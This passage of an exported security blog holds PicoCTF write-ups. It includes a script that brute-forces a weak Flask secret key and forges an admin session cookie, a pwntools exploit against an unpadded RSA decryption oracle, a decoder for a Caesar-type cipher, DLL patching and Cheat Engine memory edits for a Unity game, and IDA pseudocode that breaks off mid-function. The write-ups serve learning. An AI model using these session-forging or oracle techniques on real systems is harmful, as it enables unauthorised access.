Cookies","section":"Securities","content":" PicoCTF - Most Cookies # tags: PicoCTF CTF Web # Background # Python Flask session 學習心得\n在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。\nSource code # :::spoiler Source Code\nfrom flask import Flask, render_template, request, url_for, redirect, make_response, flash, session import random app = Flask(__name__) flag_value = open(\u0026#34;./flag\u0026#34;).read().rstrip() title = \u0026#34;Most Cookies\u0026#34; cookie_names = [\u0026#34;snickerdoodle\u0026#34;, \u0026#34;chocolate chip\u0026#34;, \u0026#34;oatmeal raisin\u0026#34;, \u0026#34;gingersnap\u0026#34;, \u0026#34;shortbread\u0026#34;, \u0026#34;peanut butter\u0026#34;, \u0026#34;whoopie pie\u0026#34;, \u0026#34;sugar\u0026#34;, \u0026#34;molasses\u0026#34;, \u0026#34;kiss\u0026#34;, \u0026#34;biscotti\u0026#34;, \u0026#34;butter\u0026#34;, \u0026#34;spritz\u0026#34;, \u0026#34;snowball\u0026#34;, \u0026#34;drop\u0026#34;, \u0026#34;thumbprint\u0026#34;, \u0026#34;pinwheel\u0026#34;, \u0026#34;wafer\u0026#34;, \u0026#34;macaroon\u0026#34;, \u0026#34;fortune\u0026#34;, \u0026#34;crinkle\u0026#34;, \u0026#34;icebox\u0026#34;, \u0026#34;gingerbread\u0026#34;, \u0026#34;tassie\u0026#34;, \u0026#34;lebkuchen\u0026#34;, \u0026#34;macaron\u0026#34;, \u0026#34;black and white\u0026#34;, \u0026#34;white chocolate macadamia\u0026#34;] app.secret_key = random.choice(cookie_names) @app.route(\u0026#34;/\u0026#34;) def main(): if session.get(\u0026#34;very_auth\u0026#34;): check = session[\u0026#34;very_auth\u0026#34;] if check == \u0026#34;blank\u0026#34;: return render_template(\u0026#34;index.html\u0026#34;, title=title) else: return make_response(redirect(\u0026#34;/display\u0026#34;)) else: resp = make_response(redirect(\u0026#34;/\u0026#34;)) session[\u0026#34;very_auth\u0026#34;] = \u0026#34;blank\u0026#34; return resp @app.route(\u0026#34;/search\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def search(): if \u0026#34;name\u0026#34; in request.form and request.form[\u0026#34;name\u0026#34;] in cookie_names: resp = make_response(redirect(\u0026#34;/display\u0026#34;)) session[\u0026#34;very_auth\u0026#34;] = request.form[\u0026#34;name\u0026#34;] return resp else: message = \u0026#34;That doesn\u0026#39;t appear to be a valid cookie.\u0026#34; category = \u0026#34;danger\u0026#34; flash(message, category) resp = make_response(redirect(\u0026#34;/\u0026#34;)) session[\u0026#34;very_auth\u0026#34;] = \u0026#34;blank\u0026#34; return resp @app.route(\u0026#34;/reset\u0026#34;) def reset(): resp = make_response(redirect(\u0026#34;/\u0026#34;)) session.pop(\u0026#34;very_auth\u0026#34;, None) return resp @app.route(\u0026#34;/display\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def flag(): if session.get(\u0026#34;very_auth\u0026#34;): check = session[\u0026#34;very_auth\u0026#34;] if check == \u0026#34;admin\u0026#34;: resp = make_response(render_template(\u0026#34;flag.html\u0026#34;, value=flag_value, title=title)) return resp flash(\u0026#34;That is a cookie! Not very special though...\u0026#34;, \u0026#34;success\u0026#34;) return render_template(\u0026#34;not-flag.html\u0026#34;, title=title, cookie_name=session[\u0026#34;very_auth\u0026#34;]) else: resp = make_response(redirect(\u0026#34;/\u0026#34;)) session[\u0026#34;very_auth\u0026#34;] = \u0026#34;blank\u0026#34; return resp if __name__ == \u0026#34;__main__\u0026#34;: app.run() :::\nRecon # 這一題看起來很簡單，我一開始也想說只要用Burp的intruder爆破name就好，不過看了一下sauce，發現他還有一個驗證機制，就是判斷cookie的value要是admin，但看了一下cookie的形式發現有點類似JWT的感覺eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZJEZ8A.b5j77V6nA0V6dzYvM_hg3yYRgJc(當然它不是JWT只是形式有點像)，尤其是這學期修了CNS，所以對JWT直覺有點難搞，果不其然，在sauce的第7行有設定secret_key當作session簽章的依據，然後在/display的地方進行驗證\nname參數要有值且必須是cookie_names list的其中一種 session的very_auth的value一定要是admin session的signature也要forge Exploit - Brute Force # from flask.sessions import SecureCookieSessionInterface from itsdangerous import URLSafeTimedSerializer import requests cookie_names = [\u0026#34;snickerdoodle\u0026#34;, \u0026#34;chocolate chip\u0026#34;, \u0026#34;oatmeal raisin\u0026#34;, \u0026#34;gingersnap\u0026#34;, \u0026#34;shortbread\u0026#34;, \u0026#34;peanut butter\u0026#34;, \u0026#34;whoopie pie\u0026#34;, \u0026#34;sugar\u0026#34;, \u0026#34;molasses\u0026#34;, \u0026#34;kiss\u0026#34;, \u0026#34;biscotti\u0026#34;, \u0026#34;butter\u0026#34;, \u0026#34;spritz\u0026#34;, \u0026#34;snowball\u0026#34;, \u0026#34;drop\u0026#34;, \u0026#34;thumbprint\u0026#34;, \u0026#34;pinwheel\u0026#34;, \u0026#34;wafer\u0026#34;, \u0026#34;macaroon\u0026#34;, \u0026#34;fortune\u0026#34;, \u0026#34;crinkle\u0026#34;, \u0026#34;icebox\u0026#34;, \u0026#34;gingerbread\u0026#34;, \u0026#34;tassie\u0026#34;, \u0026#34;lebkuchen\u0026#34;, \u0026#34;macaron\u0026#34;, \u0026#34;black and white\u0026#34;, \u0026#34;white chocolate macadamia\u0026#34;] class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface): def get_signing_serializer(self, secret_key): if not secret_key: return None signer_kwargs = dict( key_derivation=self.key_derivation, digest_method=self.digest_method ) return URLSafeTimedSerializer(secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs) def decodeFlaskCookie(secret_key, cookieValue): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.loads(cookieValue) def encodeFlaskCookie(secret_key, cookieDict): sscsi = SimpleSecureCookieSessionInterface() signingSerializer = sscsi.get_signing_serializer(secret_key) return signingSerializer.dumps(cookieDict) if __name__==\u0026#39;__main__\u0026#39;: for name in cookie_names: session = {} session[\u0026#34;very_auth\u0026#34;] = \u0026#34;admin\u0026#34; cookie = encodeFlaskCookie(name, session) r = requests.get(\u0026#34;http://mercury.picoctf.net:6259/display\u0026#34;, cookies={\u0026#34;session\u0026#34;:cookie}, allow_redirects=False) if \u0026#34;picoCTF\u0026#34; in r.text: print(r.text) break Reference # picoCTF 2021 Most Cookies manageFlaskSession.py source code Python Web Flask — 如何透過Form取得資料 [Flask教學] Flask Session 使用方法和介紹 Most Cookies - Write up 1 Most Cookies - Write up 2\n"},{"id":290,"href":"/security/practice/picoctf/general-skills/picoctf---mus1c/","title":"PicoCTF - mus1c","section":"Securities","content":" PicoCTF - mus1c # tags: PicoCTF CTF General Skill # Source code # :::spoiler Lyrics\nPico\u0026#39;s a CTFFFFFFF my mind is waitin It\u0026#39;s waitin Put my mind of Pico into This my flag is not found put This into my flag put my flag into Pico shout Pico shout Pico shout Pico My song\u0026#39;s something put Pico into This Knock This down, down, down put This into CTF shout CTF my lyric is nothing Put This without my song into my lyric Knock my lyric down, down, down shout my lyric Put my lyric into This Put my song with This into my lyric Knock my lyric down shout my lyric Build my lyric up, up ,up shout my lyric shout Pico shout It Pico CTF is fun security is important Fun is fun Put security with fun into Pico CTF Build Fun up shout fun times Pico CTF put fun times Pico CTF into my song build it up shout it shout it build it up, up shout it shout Pico :::\nRecon # 這一題挺詭異的，想了超級無敵久，完全就是只能看別人的WP[1]\nExploit - New Programming Language # 查詢歌詞的一些關鍵字會發現rockstar這個網站 Rockstar is a computer programming language designed for creating programs that are also hair metal power ballads. 感覺上也和題目的歌詞有關係\n把歌詞貼到decoder會出現一堆數字，猜測應該是ascii code Decode ascii and get flag: picoCTF{rrrocknrn0113r} Reference # mus1c - Write up\n"},{"id":291,"href":"/security/practice/picoctf/crypto/classic/picoctf---new-caesar/","title":"PicoCTF - New Caesar","section":"Securities","content":" PicoCTF - New Caesar # tags: PicoCTF CTF Crypto # Challenge: New Caesar\nSource code # ::: spoiler source code\nimport string LOWERCASE_OFFSET = ord(\u0026#34;a\u0026#34;) ALPHABET = string.ascii_lowercase[:16] def b16_encode(plain): enc = \u0026#34;\u0026#34; for c in plain: binary = \u0026#34;{0:08b}\u0026#34;.format(ord(c)) enc += ALPHABET[int(binary[:4], 2)] enc += ALPHABET[int(binary[4:], 2)] return enc def shift(c, k): t1 = ord(c) - LOWERCASE_OFFSET t2 = ord(k) - LOWERCASE_OFFSET return ALPHABET[(t1 + t2) % len(ALPHABET)] flag = \u0026#34;redacted\u0026#34; key = \u0026#34;redacted\u0026#34; assert all([k in ALPHABET for k in key]) assert len(key) == 1 b16 = b16_encode(flag) enc = \u0026#34;\u0026#34; for i, c in enumerate(b16): enc += shift(c, key[i % len(key)]) print(enc) :::\nRecon # Hint in the code It gave two hints in the code that represented by assert 1.1 The key must in the first 16 character of alphabet strings, that is, the key is composed of a~p. 1.2 The key length is just 1 Encode to binary Then it encodes each character to hex and split it in the middle. Then map the value to alphabet sequence, that is, a $\\to$ 0 b $\\to$ 1 \u0026hellip; o $\\to$ 14 p $\\to$ 15 Shift string This process is just like rot n that it shift the concatenated strings with n characters. Exploit - Recover # Guess it shift n character First, we can guess the n value for example 1. And then we try to shift it back. Regroup and Re-mapping Then we can represent the shifted string as binary. If the length of the binary value is equal to 8, that means we can regroup it to a real strings as ascii. Then repeat 16 times Here is the 16 outcomes\u0026hellip; et_tu?_23217b54456fb10e908b5e87c6e89156 v`@`CDCBHsFEEFGwsBAvJAIsFvIHtGvIJBFG qQqTUTSYWVVWXSR[RZWZYXZ[SWX §§¨befedjhgghidclckhkjikldhi ©¸¸¹svwvu{¦yxxyzª¦ut©}t|¦y©|{§z©|}uyz ºÉ¤ÉÊ¤·»·º·º¸º ËÚµÚÛµÈÌÈËÈËÉË ÜëÆëì¦Æ©ª©¨®Ù¬««¬­ÝÙ¨§Ü §¯Ù¬Ü¯®Ú­Ü¯ ¨¬­ íü×üý·×º»º¹¿ê½¼¼½¾îê¹¸í±¸°ê½í°¿ë¾í°±¹½¾ ÈèËÌËÊÀûÎÍÍÎÏÿûÊÉþÂÉÁûÎþÁÀüÏþÁÂÊÎÏ Seems the first one is quite normal. And we got the flag\u0026hellip; Flag: picoCTF{et_tu?_23217b54456fb10e908b5e87c6e89156} :::spoiler whole exploit import string LOWERCASE_OFFSET = ord(\u0026#34;a\u0026#34;) ALPHABET = string.ascii_lowercase[:16] cipher_flag = \u0026#34;apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna\u0026#34; def binToHexa(n): bnum = int(n) temp = 0 mul = 1 count = 1 hexaDeciNum = [\u0026#39;0\u0026#39;] * 100 i = 0 while bnum != 0: rem = bnum % 10 temp = temp + (rem*mul) if count % 4 == 0: if temp \u0026lt; 10: hexaDeciNum[i] = chr(temp+48) else: hexaDeciNum[i] = chr(temp+55) mul = 1 temp = 0 count = 1 i = i+1 else: mul = mul*2 count = count+1 bnum = int(bnum/10) if count != 1: hexaDeciNum[i] = chr(temp+48) if count == 1: i = i-1 hex_string = \u0026#39;\u0026#39; while i \u0026gt;= 0: hex_string += hexaDeciNum[i] i = i-1 if hex_string == \u0026#39;\u0026#39;: hex_string = \u0026#39;00\u0026#39; return hex_string tmp = \u0026#34;\u0026#34; guess_strings = \u0026#34;\u0026#34; for i in range(1, 16): for e in cipher_flag: tmp += \u0026#34;{0:04b}\u0026#34;.format((ord(e) - LOWERCASE_OFFSET + i) % len(ALPHABET)) if len(tmp) % 8 == 0: guess_strings += chr(int(binToHexa(tmp), 16)) tmp = \u0026#34;\u0026#34; tmp = \u0026#34;\u0026#34; print(guess_strings) guess_strings = \u0026#34;\u0026#34; ::: "},{"id":292,"href":"/security/practice/picoctf/crypto/rsa/picoctf---no-padding-no-problem/","title":"PicoCTF - No Padding, No Problem","section":"Securities","content":" PicoCTF - No Padding, No Problem # tags: PicoCTF CTF Crypto # Description # Oracles can be your best friend, they will decrypt anything, except the flag\u0026rsquo;s ciphertext. How will you break it? Connect with nc mercury.picoctf.net 10333.\nHint # What can you do with a different pair of ciphertext and plaintext? What if it is not so different after all\u0026hellip;\nRecon # We can try to decrypt ciphertext directly.\nciphertext: 1969221237575652521155717732207422245260989124462636800279815175985091279976278420735388546000111469136091964900122438057245980826047478280799307045156672217664430153262319375993342808217618594292553441397334562535792273632256157246548036534684500140935101268806406561259397100648254721771966657212392193037 Give me ciphertext to decrypt: 1969221237575652521155717732207422245260989124462636800279815175985091279976278420735388546000111469136091964900122438057245980826047478280799307045156672217664430153262319375993342808217618594292553441397334562535792273632256157246548036534684500140935101268806406561259397100648254721771966657212392193037 Will not decrypt the ciphertext. Try Again Exploit # We know that $Enc(m_1) * Enc(m_2) = ((m_1^e) * (m_2^e))\\ mod\\ n = (m_1 * m_2)^e\\ mod\\ n = Enc(m_1 * m_2)$ $$ c\u0026rsquo; = 2^e\\ (mod\\ n)*c \\ \\begin{align} m\u0026rsquo; \u0026amp;= {c\u0026rsquo;}^d\\ (mod\\ n) \\ \u0026amp;= 2^{ed}*c^d\\ (mod\\ n) \\ \u0026amp;= 2 * c^d\\ (mod\\ n) \\ \\end{align}\\ m = m\u0026rsquo; // 2 $$\nfrom pwn import * from Crypto.Util.number import long_to_bytes, bytes_to_long import binascii context.arch = \u0026#39;amd64\u0026#39; r = remote(\u0026#34;mercury.picoctf.net\u0026#34;, 10333) for i in range(4): r.recvline() n = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) e = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) c = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) log.info(f\u0026#34;n = {n}\\ne = {e}\\nc = {c}\u0026#34;) m = b\u0026#39;2\u0026#39; # r.sendline(long_to_bytes(pow(bytes_to_long(m), e, n))) r.recvuntil(b\u0026#34;Give me ciphertext to decrypt: \u0026#34;) r.sendline(str(pow(2, e, n) * c).encode()) response = int(str(r.recvline().strip().decode()).split(\u0026#34; \u0026#34;)[-1]) plaintext = response // 2 print(binascii.unhexlify(\u0026#34;{:x}\u0026#34;.format(plaintext))) r.close() Reference # picoCTF No Padding, No Problem\n"},{"id":293,"href":"/security/practice/picoctf/reverse/picoctf---no-way-out/","title":"PicoCTF - No way out","section":"Securities","content":" PicoCTF - No way out # Background # C Sharp / dn.spy / cheat engine\nRecon # 大概有三種解法，其中兩種是改變.dll中的內容，有點利用binary exploitation的方式顯示flag，另外一種就是利用cheat engine的方式找到儲存座標的memory然後手動改寫數值，就拿到flag\nExploit # Method 1 - Change .dll # 可以看到No way out/pico_Data/Managed/Assembly-CSharp.dll可能是一個可以用dn.spy decompile的文件，先看看有沒有甚麼可以更改的\n在APTX class中，一個Mysterious的member，而且當collision.gameObject == this.player是true的時候，this.Mysterious.SetActive(true);就會被trigger，所以這就有點像是我們在遊戲中，如果要碰到白色旗子的時候會觸發的statement，那如果我在初始化的階段就直接把this.Mysterious.SetActive(true);設定成true，是不是就可以直接拿直到flag? Implementation 直接右鍵edit class變成多加一個Start() method，然後不用任何的條件就達到剛剛說的效果，切記一定要是Start，因為Start是有被實際呼叫的method，如果取個aaa這種名字，他本來就不會被呼叫，那改成這樣也沒意義，當然，也可以取其他會被呼叫到的method name，例如Update, Awake之類的 Method 2 - Change .dll # 當然記得能改動.dll的method，我們也可以改變遊戲角色跳不過圍牆的問題，最直觀的作法是我可以直接無限制的往上跳，超過圍牆就抵達flag，不會只有跳一小段這個問題，可以查看一下EvolveGames/PlayerController/Update()這個method，其中的第51行\nif (Input.GetButton(\u0026#34;Jump\u0026#34;) \u0026amp;\u0026amp; this.canMove \u0026amp;\u0026amp; this.characterController.isGrounded \u0026amp;\u0026amp; !this.isClimbing) { this.moveDirection.y = this.jumpSpeed; } 如果改成\nif (Input.GetButton(\u0026#34;Jump\u0026#34;)) { this.moveDirection.y = this.jumpSpeed; } 跳躍的時候他就會沒有限制的增加z軸，這樣就可以翻牆拿到flag\nMethod 3 - Cheat Engine # 這個方法最有趣也最直接，還不用通靈，首先用cheat engine attach上遊戲的process 然後我們假設座標的變數應該是float type，但是我們不知道初始值是多少，所以選Unknown initial value，scan下去會發現有230451200個value founded，所以可以藉由改變現有的遊戲狀態，篩選出座標的memory Move Forward 理論上這應該會讓座標的value增加，所以要選increased value Move Backward 理論上這應該會讓座標的value增加，所以要選increased value Stay 選Unchanged value並勾選repeat 一直持續到最後會發現只有30多個，不斷嘗試disable那些memory就會發現有一個是儲存位置的，只要把那個memory改成任意座標，理論上我們就會跳過去，例如改成12，重新回到遊戲就會出現在flag附近，就可以拿到flag了 Flag: picoCTF{WELCOME_TO_UNITY!!}\nReference # "},{"id":294,"href":"/security/practice/picoctf/reverse/picoctf---not-crypto/","title":"PicoCTF - not crypto","section":"Securities","content":" PicoCTF - not crypto # Source code # :::spoiler IDA Pseudo Source COde\n__int64 __fastcall main(int a1, char **a2, char **a3) { __int128 *v4; // rax unsigned __int8 v5; // di unsigned __int8 v6; // si unsigned __int8 v7; // cl unsigned __int8 v8; // dl unsigned int v9; // r8d unsigned __int8 v10; // r11 int v16; // eax __int64 v17; // rdx unsigned int v18; // r12d char *v20; // r15 unsigned __int8 v25; // r8 int v30; // esi unsigned __int8 v32; // r12 unsigned __int8 v36; // r14 unsigned __int8 v38; // dl unsigned __int8 v40; // cl char v42; // r12 char v43; // r14 char v44; // al __int64 v45; // r13 unsigned __int8 v46; // r10 unsigned __int8 v47; // bp unsigned __int8 v48; // bl unsigned __int8 v49; // r8 unsigned __int8 v50; // r11 char v51; // dl char v54; // r10 __int64 v63; // rdx char v72; // al unsigned __int8 v84; // [rsp+Ah] [rbp-1FEh] unsigned __int8 v85; // [rsp+Bh] [rbp-1FDh] int v86; // [rsp+Ch] [rbp-1FCh] int v87; // [rsp+10h] [rbp-1F8h] unsigned __int8 v88; // [rsp+14h] [rbp-1F4h] unsigned __int8 v89; // [rsp+15h] [rbp-1F3h] unsigned __int8 v90; // [rsp+16h] [rbp-1F2h] unsigned __int8 v91; // [rsp+17h] [rbp-1F1h] unsigned __int8 v92; // [rsp+18h] [rbp-1F0h] unsigned __int8 v93; // [rsp+19h] [rbp-1EFh] unsigned __int8 v94; // [rsp+1Ah] [rbp-1EEh] unsigned __int8 v95; // [rsp+1Bh] [rbp-1EDh] unsigned __int8 v96; // [rsp+1Ch] [rbp-1ECh] char v97; // [rsp+1Dh] [rbp-1EBh] char *v98; // [rsp+20h] [rbp-1E8h] unsigned __int8 v99; // [rsp+2Ah] [rbp-1DEh] char v100; // [rsp+50h] [rbp-1B8h] char v101; // [rsp+52h] [rbp-1B6h] char v102; // [rsp+54h] [rbp-1B4h] char v103; // [rsp+56h] [rbp-1B2h] char v104; // [rsp+58h] [rbp-1B0h] char v105; // [rsp+5Ah] [rbp-1AEh] char v106; // [rsp+5Ch] [rbp-1ACh] char v107; // [rsp+5Eh] [rbp-1AAh] __int128 v108; // [rsp+60h] [rbp-1A8h] char ptr[64]; // [rsp+70h] [rbp-198h] BYREF __int128 v110; // [rsp+B0h] [rbp-158h] BYREF char v111; // [rsp+C0h] [rbp-148h] BYREF char v112[15]; // [rsp+150h] [rbp-B8h] BYREF __int128 v113; // [rsp+160h] [rbp-A8h] __int128 v115[4]; // [rsp+180h] [rbp-88h] BYREF char v116; // [rsp+1C0h] [rbp-48h] BYREF unsigned __int64 v117; // [rsp+1C8h] [rbp-40h] v117 = __readfsqword(0x28u); puts(\u0026#34;I heard you wanted to bargain for a flag... whatcha got?\u0026#34;); __asm { vmovdqa xmm0, cs:xmmword_21A0 } v4 = \u0026amp;v110; v5 = -104; v6 = 50; v7 = 108; v8 = 28; __asm { vmovdqa [rsp+208h+var_158], xmm0 } v9 = 4; do { if ( (v9 \u0026amp; 3) == 0 ) { v10 = byte_20A0[v6]; v6 = byte_20A0[v7]; v7 = byte_20A0[v8]; v8 = byte_20A0[v5]; v5 = byte_2080[v9 \u0026gt;\u0026gt; 2] ^ v10; } v5 ^= *v4; ++v9; v4 = (v4 + 4); v6 ^= *(v4 - 3); v7 ^= *(v4 - 2); v8 ^= *(v4 - 1); *(v4 + 12) = v5; *(v4 + 13) = v6; *(v4 + 14) = v7; *(v4 + 15) = v8; } while ( v9 != 44 ); __asm { vmovdqa xmm0, cs:xmmword_21B0 vmovdqa [rsp+208h+var_A8], xmm0 } fread(ptr, 1uLL, 0x40uLL, stdin); __asm { vmovdqa xmm0, cs:xmmword_21C0 vmovdqa [rsp+208h+var_88], xmm0 vmovdqa xmm0, cs:xmmword_21D0 } v108 = v110; __asm { vmovdqa [rsp+208h+var_78], xmm0 vmovdqa xmm0, cs:xmmword_21E0 vmovdqa [rsp+208h+var_68], xmm0 vmovdqa xmm0, cs:xmmword_21F0 vmovdqa [rsp+208h+var_58], xmm0 } v100 = v112[0]; v101 = v112[2]; v102 = v112[4]; v103 = v112[6]; v104 = v112[8]; v105 = v112[10]; v106 = v112[12]; v107 = v112[14]; v98 = v115; v16 = 16; do { if ( v16 == 16 ) { v20 = \u0026amp;v111; __asm { vmovdqa xmm4, [rsp+208h+var_A8] } LOBYTE(v87) = byte_20A0[(v113 ^ v108)]; __asm { vpextrb rax, xmm4, 4 } LOBYTE(v86) = byte_20A0[(BYTE4(v108) ^ _RAX)]; v94 = byte_20A0[BYTE8(v113) ^ BYTE8(v108)]; __asm { vpextrb rax, xmm4, 0Ch } v93 = byte_20A0[(BYTE12(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 1 } v25 = byte_20A0[(BYTE1(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 5 } v85 = byte_20A0[(BYTE5(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 9 } v84 = byte_20A0[(BYTE9(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Dh } v92 = byte_20A0[(BYTE13(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 2 } LOBYTE(v30) = byte_20A0[(BYTE2(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 6 } v32 = byte_20A0[(BYTE6(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Ah } v91 = byte_20A0[(BYTE10(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Eh } v96 = v32; v88 = v25; v90 = byte_20A0[(BYTE14(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 3 } v36 = byte_20A0[(BYTE3(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 7 } v95 = v36; v38 = byte_20A0[(BYTE7(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Bh } v40 = byte_20A0[(BYTE11(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Fh } v89 = byte_20A0[(HIBYTE(v108) ^ _RAX)]; do { v42 = v91 ^ v89 ^ v87 ^ v85; v99 = v87 ^ v89; v43 = v90 ^ v95 ^ v86 ^ v84; v97 = v30 ^ v38 ^ v94 ^ v92; v44 = v40 ^ v96 ^ v93 ^ v88; v45 = ((2 * (v86 ^ v95)) ^ (27 * ((v86 ^ v95) \u0026gt;\u0026gt; 7)) ^ v95 ^ v43 ^ v20[7]); v46 = v20[10] ^ v97 ^ v30 ^ (27 * ((v30 ^ v38) \u0026gt;\u0026gt; 7)) ^ (2 * (v30 ^ v38)); v47 = v20[11] ^ v97 ^ v38 ^ (2 * (v38 ^ v94)) ^ (27 * ((v38 ^ v94) \u0026gt;\u0026gt; 7)); v48 = v88 ^ v44 ^ v20[13] ^ (2 * (v88 ^ v96)) ^ (27 * ((v88 ^ v96) \u0026gt;\u0026gt; 7)); v49 = v96 ^ v44 ^ v20[14] ^ (27 * ((v40 ^ v96) \u0026gt;\u0026gt; 7)) ^ (2 * (v40 ^ v96)); v50 = v44 ^ v20[15] ^ v40 ^ (2 * (v40 ^ v93)) ^ (27 * ((v40 ^ v93) \u0026gt;\u0026gt; 7)); LOBYTE(v87) = byte_20A0[((2 * (v87 ^ v85)) ^ (27 * ((v87 ^ v85) \u0026gt;\u0026gt; 7)) ^ v42 ^ *v20 ^ v87)]; LOBYTE(v86) = byte_20A0[((2 * (v86 ^ v84)) ^ (27 * ((v86 ^ v84) \u0026gt;\u0026gt; 7)) ^ v86 ^ v43 ^ v20[4])]; v94 = byte_20A0[((2 * (v94 ^ v92)) ^ (27 * ((v94 ^ v92) \u0026gt;\u0026gt; 7)) ^ v94 ^ v97 ^ v20[8])]; v93 = byte_20A0[((27 * ((v93 ^ v88) \u0026gt;\u0026gt; 7)) ^ (2 * (v93 ^ v88)) ^ v93 ^ v20[12] ^ v44)]; v88 = byte_20A0[((2 * (v85 ^ v91)) ^ (27 * ((v85 ^ v91) \u0026gt;\u0026gt; 7)) ^ v85 ^ v42 ^ v20[1])]; v85 = byte_20A0[((27 * ((v84 ^ v90) \u0026gt;\u0026gt; 7)) ^ (2 * (v84 ^ v90)) ^ v84 ^ v43 ^ v20[5])]; v84 = byte_20A0[((27 * ((v30 ^ v92) \u0026gt;\u0026gt; 7)) ^ (2 * (v30 ^ v92)) ^ v20[9] ^ v97 ^ v92)]; v92 = byte_20A0[v48]; v51 = v91 ^ v42 ^ v20[2]; v20 += 16; v30 = byte_20A0[((2 * (v91 ^ v89)) ^ (27 * ((v91 ^ v89) \u0026gt;\u0026gt; 7)) ^ v51)]; v96 = byte_20A0[((27 * ((v90 ^ v95) \u0026gt;\u0026gt; 7)) ^ (2 * (v90 ^ v95)) ^ v43 ^ *(v20 - 10) ^ v90)]; v91 = byte_20A0[v46]; v90 = byte_20A0[v49]; v40 = byte_20A0[v47]; v38 = byte_20A0[v45]; v95 = byte_20A0[((27 * (v99 \u0026gt;\u0026gt; 7)) ^ (2 * v99) ^ v89 ^ v42 ^ *(v20 - 13))]; v89 = byte_20A0[v50]; } while ( v112 != v20 ); LOBYTE(v30) = v105 ^ v30; LOBYTE(v87) = v100 ^ v87; _R15D = v30; __asm { vmovd xmm5, r15d } v54 = v86; LOBYTE(v86) = v103 ^ v90; _R9D = (v101 ^ v91); _R10D = (v102 ^ v54); _EDX = (v107 ^ v96); _R13D = (v104 ^ v94); __asm { vmovd xmm4, edx vmovd xmm7, r9d vpinsrb xmm5, xmm5, ebx, 1 vmovd xmm3, r10d } v63 = 15LL; _ESI = (v106 ^ v93); __asm { vmovd xmm1, r13d vmovd xmm0, [rsp+208h+var_1F8] vmovd xmm6, [rsp+208h+var_1FC] vpinsrb xmm7, xmm7, [rsp+208h+var_1FD], 1 vpinsrb xmm0, xmm0, eax, 1 vpinsrb xmm1, xmm1, r11d, 1 vpunpcklwd xmm0, xmm0, xmm7 } v72 = HIBYTE(v113); __asm { vpinsrb xmm3, xmm3, [rsp+208h+var_1FE], 1 vpinsrb xmm6, xmm6, [rsp+208h+var_1F4], 1 vpunpcklwd xmm1, xmm1, xmm5 vpunpcklwd xmm3, xmm3, xmm6 vmovd xmm2, esi vpunpckldq xmm0, xmm0, xmm3 vpinsrb xmm2, xmm2, r8d, 1 vpinsrb xmm4, xmm4, ecx, 1 vpunpcklwd xmm2, xmm2, xmm4 vpunpckldq xmm1, xmm1, xmm2 vpunpcklqdq xmm0, xmm0, xmm1 vmovdqa [rsp+208h+var_98], xmm0 } if ( HIBYTE(v113) != 0xFF ) goto LABEL_14; v72 = BYTE14(v113); HIBYTE(v113) = 0; v63 = 14LL; if ( BYTE14(v113) != 0xFF ) goto LABEL_14; v72 = BYTE13(v113); BYTE14(v113) = 0; v63 = 13LL; if ( BYTE13(v113) != 0xFF ) goto LABEL_14; v72 = BYTE12(v113); BYTE13(v113) = 0; v63 = 12LL; if ( BYTE12(v113) != 0xFF ) goto LABEL_14; v72 = BYTE11(v113); BYTE12(v113) = 0; v63 = 11LL; if ( BYTE11(v113) != 0xFF ) goto LABEL_14; v72 = BYTE10(v113); BYTE11(v113) = 0; v63 = 10LL; if ( BYTE10(v113) != 0xFF ) goto LABEL_14; v72 = BYTE9(v113); BYTE10(v113) = 0; v63 = 9LL; if ( BYTE9(v113) != 0xFF ) goto LABEL_14; v72 = BYTE8(v113); BYTE9(v113) = 0; v63 = 8LL; if ( BYTE8(v113) != 0xFF ) goto LABEL_14; v72 = BYTE7(v113); BYTE8(v113) = 0; v63 = 7LL; if ( BYTE7(v113) != 0xFF ) goto LABEL_14; v72 = BYTE6(v113); BYTE7(v113) = 0; v63 = 6LL; if ( BYTE6(v113) != 0xFF ) goto LABEL_14; v72 = BYTE5(v113); BYTE6(v113) = 0; v63 = 5LL; if ( BYTE5(v113) != 0xFF ) goto LABEL_14; v72 = BYTE4(v113); BYTE5(v113) = 0; v63 = 4LL; if ( BYTE4(v113) != 0xFF ) goto LABEL_14; v72 = BYTE3(v113); BYTE4(v113) = 0; v63 = 3LL; if ( BYTE3(v113) != 0xFF ) goto LABEL_14; v72 = BYTE2(v113); BYTE3(v113) = 0; v63 = 2LL; if ( BYTE2(v113) != 0xFF ) goto LABEL_14; v72 = BYTE1(v113); BYTE2(v113) = 0; v63 = 1LL; if ( BYTE1(v113) == 0xFF \u0026amp;\u0026amp; (v72 = v113, BYTE1(v113) = 0, v63 = 0LL, v113 == 0xFF) ) { LOBYTE(v113) = 0; v16 = 0; } else { LABEL_14: *(\u0026amp;v113 + v63) = v72 + 1; v16 = 0; } } v17 = v16++; *v98++ ^= *(\u0026amp;v115[-1] + v17); } while ( 